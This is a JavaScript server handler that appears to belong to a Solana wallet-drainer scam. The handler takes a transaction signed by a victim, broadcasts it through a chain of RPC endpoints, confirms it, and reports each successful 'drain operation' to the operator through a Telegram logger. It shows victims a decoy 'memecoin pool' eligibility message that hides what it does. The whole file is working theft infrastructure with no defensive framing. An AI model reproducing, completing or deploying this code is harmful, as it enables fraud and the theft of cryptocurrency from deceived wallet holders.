const { Connection, PublicKey, Transaction } = require('@solana/web3.js');

// Import centralized error handling
const errorHandler = require('../src/errorHandler.js');

// Import Telegram logger singleton
const telegramLogger = require('../src/telegram.js');

// Import centralized RPC configuration
const { RPC_ENDPOINTS } = require('../env.config.js');

// RPC endpoints with fallback strategy (prioritizing Helius and Shyft)
const rpcEndpoints = RPC_ENDPOINTS;

module.exports = async function broadcastHandler(req, res) {
  try {
    const { signedTransaction, rpcEndpoint } = req.body;
    
    // Enhanced input validation
    if (!signedTransaction || typeof signedTransaction !== 'string') {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing or invalid signedTransaction parameter',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    // Validate base64 format
    if (!/^[A-Za-z0-9+/]*={0,2}$/.test(signedTransaction)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid base64 format for signedTransaction',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    // Validate RPC endpoint if provided
    if (rpcEndpoint && typeof rpcEndpoint !== 'string') {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid rpcEndpoint parameter',
        message: 'Wallet not eligible for memecoin pool'
      });
    }
    
    console.log('[BROADCAST] Starting transaction broadcast...');
    
    // Decode the signed transaction
    let transaction;
    try {
      const transactionBuffer = Buffer.from(signedTransaction, 'base64');
      transaction = Transaction.from(transactionBuffer);
      console.log('[BROADCAST] Transaction decoded successfully');
    } catch (decodeError) {
      console.error('[BROADCAST] Failed to decode transaction:', decodeError);
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid transaction format' 
      });
    }
    
    // Try to broadcast using the provided RPC endpoint first, then fallbacks
    let connection;
    let signature = null;
    
    const endpointsToTry = rpcEndpoint ? [rpcEndpoint, ...rpcEndpoints] : rpcEndpoints;
    
    try {
      const broadcastResult = await errorHandler.withRPCFallback(async (endpoint) => {
        console.log(`[BROADCAST] Trying RPC endpoint: ${endpoint}`);
        
        const conn = new Connection(endpoint, 'confirmed');
        
        // Verify the connection
        const blockHeight = await conn.getBlockHeight();
        console.log(`[BROADCAST] Connected to ${endpoint}, block height: ${blockHeight}`);
        
        // Broadcast the transaction
        console.log('[BROADCAST] Broadcasting transaction...');
        const sig = await conn.sendRawTransaction(transaction.serialize(), {
          skipPreflight: false,
          preflightCommitment: 'confirmed',
          maxRetries: 3
        });
        
        console.log(`[BROADCAST] Transaction broadcast successful! Signature: ${sig}`);
        return { connection: conn, signature: sig };
        
      }, endpointsToTry, {
        context: 'Transaction Broadcast',
        signedTransaction: signedTransaction.substring(0, 50) + '...'
      });
      
      connection = broadcastResult.connection;
      signature = broadcastResult.signature;
      
    } catch (broadcastError) {
      return res.status(500).json(errorHandler.formatApiError(broadcastError, {
        context: 'Transaction Broadcast Failure'
      }));
    }
    
    // Wait for confirmation
    let confirmationStatus = 'unknown';
    try {
      console.log('[BROADCAST] Waiting for transaction confirmation...');
      const confirmation = await connection.confirmTransaction(signature, 'confirmed');
      confirmationStatus = confirmation.value.confirmations ? 'confirmed' : 'failed';
      console.log(`[BROADCAST] Transaction confirmation status: ${confirmationStatus}`);
    } catch (confirmError) {
      console.error('[BROADCAST] Confirmation error:', confirmError.message);
      confirmationStatus = 'error';
    }
    
    // Get transaction details for logging
    let transactionDetails = {};
    try {
      if (connection && signature) {
        const txInfo = await connection.getTransaction(signature, {
          commitment: 'confirmed',
          maxSupportedTransactionVersion: 0
        });
        
        if (txInfo) {
          transactionDetails = {
            fee: txInfo.meta?.fee || 0,
            instructions: txInfo.transaction.message.instructions.length,
            accounts: txInfo.transaction.message.accountKeys.length,
            blockTime: txInfo.blockTime
          };
        }
      }
    } catch (detailError) {
      console.error('[BROADCAST] Failed to get transaction details:', detailError.message);
    }
    
    // Log the successful drain operation
    try {
      
      await telegramLogger.logDrainExecuted({
        signature: signature,
        status: confirmationStatus,
        rpcEndpoint: connection.rpcEndpoint,
        transactionDetails: transactionDetails,
        timestamp: new Date().toISOString()
      });
      
      console.log('[BROADCAST] Drain operation logged successfully');
    } catch (logError) {
      console.error('[BROADCAST] Failed to log drain operation:', logError.message);
    }
    
    // Return success response
    res.status(200).json({
      success: true,
      signature: signature,
      status: confirmationStatus,
      rpcEndpoint: connection.rpcEndpoint,
      transactionDetails: transactionDetails,
      message: 'Drain operation executed successfully',
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('[BROADCAST] Handler error:', error);
    
    if (!res.headersSent) {
      res.status(500).json(errorHandler.formatApiError(error, {
        context: 'Broadcast Handler Failure'
      }));
    }
  }
}
